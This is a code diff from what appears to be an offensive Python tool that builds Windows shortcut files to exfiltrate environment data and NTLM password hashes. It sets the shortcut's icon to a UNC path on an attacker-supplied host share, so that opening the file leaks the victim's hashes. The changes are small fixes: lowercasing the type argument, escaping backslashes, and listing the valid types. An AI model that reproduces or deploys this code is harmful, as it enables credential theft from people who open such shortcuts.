@@ -38,10 +38,10 @@ parser.add_argument('--type', metavar='t', type=str, nargs=1, default=["all"],
                     + "\n* ntlm - Will exfiltrate windows NTLM password hashes"
                     + "\n* all (default) - Will exfiltrate everything we can")
 args = parser.parse_args()
-type = args.type[0]
+type = args.type[0].lower()
 def run():
     path = ""
-    target = "C:\Windows\System32\explorer.exe .";
+    target = "C:\\Windows\\System32\\explorer.exe .";
     icon = "";
     if args.execute != None:
         args.execute = args.execute[0].split(" ")
@@ -59,6 +59,10 @@ def run():
         icon = "\\\\" + args.host[0] + "\\Share\\" + str(random.randint(0, 50000)) + ".ico"
     else:
         print("Invalid type given.")
+        print("Valid types are:")
+        print("- environment")
+        print("- ntlm")
+        print("- all")
         return
     if is_windows:
         ws = win32com.client.Dispatch("wscript.shell")
